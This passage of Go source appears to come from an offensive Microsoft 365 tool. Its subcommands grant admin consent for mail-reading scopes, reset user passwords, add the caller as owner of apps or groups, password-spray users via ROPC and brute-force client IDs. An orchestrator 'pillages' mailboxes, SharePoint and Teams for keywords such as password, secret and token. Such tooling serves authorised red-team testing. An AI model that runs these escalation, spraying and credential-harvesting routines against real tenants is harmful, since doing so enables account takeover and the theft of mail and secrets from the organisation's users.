	cmd.Flags().BoolVar(&autoGraph, "auto-graph", true, "Auto-resolve Microsoft Graph SP ID")
	cmd.MarkFlagRequired("sp-id")
	cmd.MarkFlagRequired("role-id")
	return cmd
}

func escalateAdminConsentCmd() *cobra.Command {
	var clientSPID, resourceSPID, scopes string
	var autoGraph bool
	cmd := &cobra.Command{
		Use:   "admin-consent",
		Short: "Grant admin consent (AllPrincipals) for delegated permissions on a service principal",
		RunE: func(cmd *cobra.Command, args []string) error {
			client, err := app.GraphClient()
			if err != nil {
				return err
			}
			output.Header("Escalate: Admin Consent Grant")

			if autoGraph && resourceSPID == "" {
				spID, err := escalate.FindGraphSPID(context.Background(), client)
				if err != nil {
					return fmt.Errorf("find Graph SP: %w", err)
				}
				resourceSPID = spID
				output.Success("Graph SP: %s", spID)
			}
			if resourceSPID == "" {
				return fmt.Errorf("provide --resource-sp-id or use --auto-graph")
			}

			result, err := escalate.GrantAdminConsent(context.Background(), client, clientSPID, resourceSPID, scopes)
			if err != nil {
				return err
			}
			printAndSave("escalate-admin-consent", result)
			return nil
		},
	}
	cmd.Flags().StringVar(&clientSPID, "sp-id", "", "Service principal ID to grant consent for")
	cmd.Flags().StringVar(&resourceSPID, "resource-sp-id", "", "Resource SP ID (default: auto-resolve Graph)")
	cmd.Flags().StringVar(&scopes, "scopes", "Mail.Read Mail.ReadWrite User.Read", "Space-separated delegated permission scopes")
	cmd.Flags().BoolVar(&autoGraph, "auto-graph", true, "Auto-resolve Microsoft Graph SP ID")
	cmd.MarkFlagRequired("sp-id")
	return cmd
}

func escalateResetPasswordCmd() *cobra.Command {
	var userID, newPassword string
	cmd := &cobra.Command{
		Use:   "reset-password",
		Short: "Reset a user's password (requires User Admin or Password Admin role)",
		RunE: func(cmd *cobra.Command, args []string) error {
			client, err := app.GraphClient()
			if err != nil {
				return err
			}
			output.Header("Escalate: Reset Password")
			err = escalate.ResetPassword(context.Background(), client, userID, newPassword)
			if err != nil {
				return err
			}
			return nil
		},
	}
	cmd.Flags().StringVar(&userID, "user-id", "", "Target user ID or UPN")
	cmd.Flags().StringVar(&newPassword, "password", "", "New password to set")
	cmd.MarkFlagRequired("user-id")
	cmd.MarkFlagRequired("password")
	return cmd
}

func escalateAddOwnerCmd() *cobra.Command {
	var appObjectID, groupID, principalID string
	cmd := &cobra.Command{
		Use:   "add-owner",
		Short: "Add yourself as owner of an app or group",
		RunE: func(cmd *cobra.Command, args []string) error {
			client, err := app.GraphClient()
			if err != nil {
				return err
			}
			output.Header("Escalate: Add Owner")

			if appObjectID != "" {
				err = escalate.AddAppOwner(context.Background(), client, appObjectID, principalID)
				if err != nil {
					return err
				}
				output.Success("Added %s as owner of app %s", principalID, appObjectID)
			}
			if groupID != "" {
				err = escalate.AddGroupOwner(context.Background(), client, groupID, principalID)
				if err != nil {
					return err
				}
				output.Success("Added %s as owner of group %s", principalID, groupID)
			}
			if appObjectID == "" && groupID == "" {
				return fmt.Errorf("provide --app-id or --group-id")
			}
			return nil
		},
	}
	cmd.Flags().StringVar(&appObjectID, "app-id", "", "Application object ID")
	cmd.Flags().StringVar(&groupID, "group-id", "", "Group ID")
	cmd.Flags().StringVar(&principalID, "principal-id", "", "Principal ID to add as owner")
	cmd.MarkFlagRequired("principal-id")
	return cmd
}

// ============================= SPRAY =============================

func sprayCmd() *cobra.Command {
	cmd := &cobra.Command{
		Use:   "spray",
		Short: "Password spray and client ID enumeration",
	}
	cmd.AddCommand(sprayPasswordCmd(), sprayBruteClientIDCmd())
	return cmd
}

func sprayPasswordCmd() *cobra.Command {
	var tenantID, clientID, usernameFile, passwordFile string
	var usernameList, passwordList string
	var delaySec int
	cmd := &cobra.Command{
		Use:   "password",
		Short: "Password spray against M365 users via ROPC (Resource Owner Password Credentials)",
		RunE: func(cmd *cobra.Command, args []string) error {
			output.Header("Spray: Password Spray")
			output.Warn("Ensure you have authorization before spraying credentials.")

			var usernames, passwords []string

			if usernameFile != "" {
				lines, err := readLines(usernameFile)
				if err != nil {
					return fmt.Errorf("read username file: %w", err)
				}
				usernames = lines
			} else if usernameList != "" {
				for _, u := range strings.Split(usernameList, ",") {
					u = strings.TrimSpace(u)
					if u != "" {
						usernames = append(usernames, u)
					}
				}
			}

			if passwordFile != "" {
				lines, err := readLines(passwordFile)
				if err != nil {
					return fmt.Errorf("read password file: %w", err)
				}
				passwords = lines
			} else if passwordList != "" {
				for _, p := range strings.Split(passwordList, ",") {
					p = strings.TrimSpace(p)
					if p != "" {
						passwords = append(passwords, p)
					}
				}
			}

			if len(usernames) == 0 {
				return fmt.Errorf("provide --users (comma-separated) or --user-file")
			}
			if len(passwords) == 0 {
				return fmt.Errorf("provide --passwords (comma-separated) or --pass-file")
			}

			ctx, cancel := context.WithCancel(context.Background())
			defer cancel()

			result, err := spray.PasswordSpray(ctx, tenantID, clientID, usernames, passwords, delaySec)
			if err != nil {
				return err
			}
			printAndSave("spray-password", result)
			return nil
		},
	}
	cmd.Flags().StringVar(&tenantID, "tenant-id", "", "Target tenant ID or domain (required)")
	cmd.Flags().StringVar(&clientID, "client-id", "", "Client ID to authenticate through (default: Azure PowerShell)")
	cmd.Flags().StringVar(&usernameList, "users", "", "Comma-separated list of usernames/UPNs")
	cmd.Flags().StringVar(&usernameFile, "user-file", "", "File with one username per line")
	cmd.Flags().StringVar(&passwordList, "passwords", "", "Comma-separated list of passwords to spray")
	cmd.Flags().StringVar(&passwordFile, "pass-file", "", "File with one password per line")
	cmd.Flags().IntVar(&delaySec, "delay", 0, "Delay in seconds between attempts (recommended: 30+)")
	cmd.MarkFlagRequired("tenant-id")
	return cmd
}

func sprayBruteClientIDCmd() *cobra.Command {
	var tenantID, clientIDFile, customIDs string
	var delaySec int
	var useBuiltin bool
	cmd := &cobra.Command{
		Use:   "brute-clientid",
		Short: "Enumerate valid client IDs in a tenant (tests well-known + custom list)",
		RunE: func(cmd *cobra.Command, args []string) error {
			output.Header("Spray: Brute Client ID")

			var candidates []spray.ClientIDHit

			if useBuiltin {
				candidates = append(candidates, spray.WellKnownClientIDs...)
			}

			if customIDs != "" {
				for _, id := range strings.Split(customIDs, ",") {
					id = strings.TrimSpace(id)
					if id != "" {
						candidates = append(candidates, spray.ClientIDHit{ClientID: id, Name: "custom"})
					}
				}
			}

			if clientIDFile != "" {
				lines, err := readLines(clientIDFile)
				if err != nil {
					return fmt.Errorf("read client ID file: %w", err)
				}
				for _, l := range lines {
					candidates = append(candidates, spray.ClientIDHit{ClientID: l, Name: "from-file"})
				}
			}

			if len(candidates) == 0 {
				return fmt.Errorf("no client IDs to test — use --builtin, --ids, or --id-file")
			}

			ctx, cancel := context.WithCancel(context.Background())
			defer cancel()

			result, err := spray.BruteClientID(ctx, tenantID, candidates, delaySec)
			if err != nil {
				return err
			}
			printAndSave("spray-brute-clientid", result)
			return nil
		},
	}
	cmd.Flags().StringVar(&tenantID, "tenant-id", "", "Target tenant ID or domain (required)")
	cmd.Flags().BoolVar(&useBuiltin, "builtin", true, "Test well-known client IDs (Azure CLI, Office, Teams, etc.)")
	cmd.Flags().StringVar(&customIDs, "ids", "", "Additional comma-separated client IDs to test")
	cmd.Flags().StringVar(&clientIDFile, "id-file", "", "File with one client ID per line")
	cmd.Flags().IntVar(&delaySec, "delay", 1, "Delay in seconds between requests")
	cmd.MarkFlagRequired("tenant-id")
	return cmd
}

// readLines reads a file and returns non-empty, non-comment lines.
func readLines(path string) ([]string, error) {
	data, err := os.ReadFile(path)
	if err != nil {
		return nil, err
	}
	var lines []string
	for _, line := range strings.Split(string(data), "\n") {
		line = strings.TrimSpace(line)
		if line != "" && !strings.HasPrefix(line, "#") {
			lines = append(lines, line)
		}
	}
	return lines, nil
}

// ============================= RUN (Orchestrator) =============================

func runCmd() *cobra.Command {
	var keywords string
	var disableRecon, disableEmail, disableTeams bool
	var outputJSON, outputHTML string
	cmd := &cobra.Command{
		Use:   "run",
		Short: "Orchestrated full run: recon -> pillage with keyword detectors",
		RunE: func(cmd *cobra.Command, args []string) error {
			client, err := app.GraphClient()
			if err != nil {
				return err
			}
			output.Banner()
			ctx := context.Background()
			allResults := make(map[string]interface{})
			var htmlSections []output.HTMLSection

			// Recon phase
			if !disableRecon {
				output.Header("Phase 1: Reconnaissance")
				reconResults := recon.All(ctx, client)
				allResults["recon"] = reconResults
				htmlSections = append(htmlSections, output.HTMLSection{Title: "Reconnaissance", Content: output.PrettyJSON(reconResults)})
				output.Success("Recon complete")
			}

			kw := strings.Split(keywords, ",")

			// Pillage: Mailbox
			if !disableEmail {
				output.Header("Phase 2: Mailbox Search")
				mailResults, err := pillage.SearchMailbox(ctx, client, kw, "", 100)
				if err != nil {
					output.Error("Mailbox search: %v", err)
				} else {
					allResults["mailbox"] = mailResults
					htmlSections = append(htmlSections, output.HTMLSection{Title: "Mailbox Search", Content: output.PrettyJSON(mailResults)})
					output.Success("Mailbox search complete")
				}
			}

			// Pillage: SharePoint
			output.Header("Phase 3: SharePoint/OneDrive Search")
			spResults, err := pillage.SearchSharePoint(ctx, client, kw, 100, "")
			if err != nil {
				output.Error("SharePoint search: %v", err)
			} else {
				allResults["sharepoint"] = spResults
				htmlSections = append(htmlSections, output.HTMLSection{Title: "SharePoint/OneDrive Search", Content: output.PrettyJSON(spResults)})
				output.Success("SharePoint search complete")
			}

			// Pillage: Teams
			if !disableTeams {
				output.Header("Phase 4: Teams Search")
				teamsResults, err := pillage.SearchTeams(ctx, client, kw, 100)
				if err != nil {
					output.Error("Teams search: %v", err)
				} else {
					allResults["teams"] = teamsResults
					htmlSections = append(htmlSections, output.HTMLSection{Title: "Teams Search", Content: output.PrettyJSON(teamsResults)})
					output.Success("Teams search complete")
				}
			}

			// Output
			if outputJSON != "" {
				if err := output.WriteJSON(outputJSON, allResults); err != nil {
					output.Error("Failed to write JSON report: %v", err)
				} else {
					output.Success("JSON report: %s", outputJSON)
				}
			}
			if outputHTML != "" {
				if err := output.WriteHTML(outputHTML, htmlSections); err != nil {
					output.Error("Failed to write HTML report: %v", err)
				} else {
					output.Success("HTML report: %s", outputHTML)
				}
			}

			output.Header("Run Complete")
			return nil
		},
	}
	cmd.Flags().StringVar(&keywords, "keywords", "password,secret,credential,key,token", "Comma-separated detector keywords")
	cmd.Flags().BoolVar(&disableRecon, "disable-recon", false, "Skip reconnaissance phase")
	cmd.Flags().BoolVar(&disableEmail, "disable-email", false, "Skip mailbox search")
	cmd.Flags().BoolVar(&disableTeams, "disable-teams", false, "Skip Teams search")
	cmd.Flags().StringVar(&outputJSON, "output-json", "", "JSON report path")
	cmd.Flags().StringVar(&outputHTML, "output-html", "", "HTML report path")
	return cmd
}

